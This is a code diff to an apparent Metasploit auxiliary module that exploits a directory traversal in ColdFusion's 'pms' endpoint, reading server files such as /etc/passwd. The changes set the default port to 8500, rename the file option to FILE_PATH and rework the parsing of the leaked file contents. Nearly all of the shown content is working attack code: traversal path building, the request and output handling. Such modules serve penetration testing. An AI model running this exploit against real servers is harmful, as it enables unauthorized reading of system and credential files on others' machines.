@@ -42,7 +42,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        Opt::RPORT(80),
+        Opt::RPORT(8500),
         OptString.new('TARGETURI', [true, 'The base path for ColdFusion', '/']),
         OptString.new('FILE_PATH', [true, 'File path to read from the server', '/etc/passwd']),
         OptInt.new('NUMBER_OF_LINES', [true, 'Number of lines to retrieve', 10000]),
@@ -72,10 +72,10 @@ class MetasploitModule < Msf::Auxiliary
     print_status('Attempting to retrieve UUID ...')
     uuid = get_uuid
     print_good("UUID found: #{uuid}")
-    print_status("Attempting to exploit directory traversal to read #{datastore['FILE_NAME']}")
+    print_status("Attempting to exploit directory traversal to read #{datastore['FILE_PATH']}")
 
     traversal_path = '../' * datastore['DEPTH']
-    file_path = "#{traversal_path}#{datastore['FILE_NAME']}"
+    file_path = "#{traversal_path}#{datastore['FILE_PATH']}"
 
     res = send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'pms'),
@@ -99,11 +99,8 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::UnexpectedReply, "Failed to retrieve file content, server responded with status code: #{res.code}")
     end
 
-    # TODO: Once we have a better idea of the formatting the file is returned in edit this loop to trim the fat.
-    # TODO  From the screenshot in the write up it looks like it returns an array where the first element is null and
-    # TODO  the file contents are listed after that but each line is prefixed with a "_"
     file_contents = []
-    res.body.split("\n").each do |html_response_line|
+    res.body[1..-2].split(', ').each do |html_response_line|
       print_status(html_response_line)
       file_contents << html_response_line
     end
